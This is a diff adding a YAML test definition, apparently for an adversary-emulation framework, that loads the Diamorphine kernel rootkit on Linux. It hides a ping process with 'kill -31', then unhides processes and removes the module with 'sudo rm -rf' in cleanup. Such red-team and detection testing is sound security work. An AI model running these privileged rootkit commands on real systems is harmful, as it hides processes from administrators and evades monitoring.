@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: Loadable Kernel Module based Rootkit (Diamorphine)
+description: |
+    Loads Diamorphine kernel module, which hides itself and a processes.
+args:
+    - name: repo
+      type: string
+      default: https://github.com/m0nad/Diamorphine/
+    - name: rev
+      type: string
+      default: 898810523aa2033f582a4a5903ffe453334044f9
+    - name: rootkit_name
+      type: string
+      default: diamorphine
+uuid: 0b996469-48c6-46e2-8155-a17f8b6c2247
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1014: Rootkit'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: loadable-kernel-module-based-rootkit-(diamorphine)
+      inline: |
+        sudo modprobe {{.Args.rootkit_name}}
+        ping -c 10 localhost >/dev/null & TARGETPID="$!"
+        ps $TARGETPID
+        kill -31 $TARGETPID
+        ps $TARGETPID || echo "process ${TARGETPID} hidden"
+      executor: sh
+      cleanup:
+        inline: |
+            kill -63 1
+            sudo modprobe -r {{.Args.rootkit_name}}
+            sudo rm -rf /lib/modules/$(uname -r)/{{.Args.rootkit_name}}.ko /tmp/atomic
+            sudo depmod -a
+        executor: sh
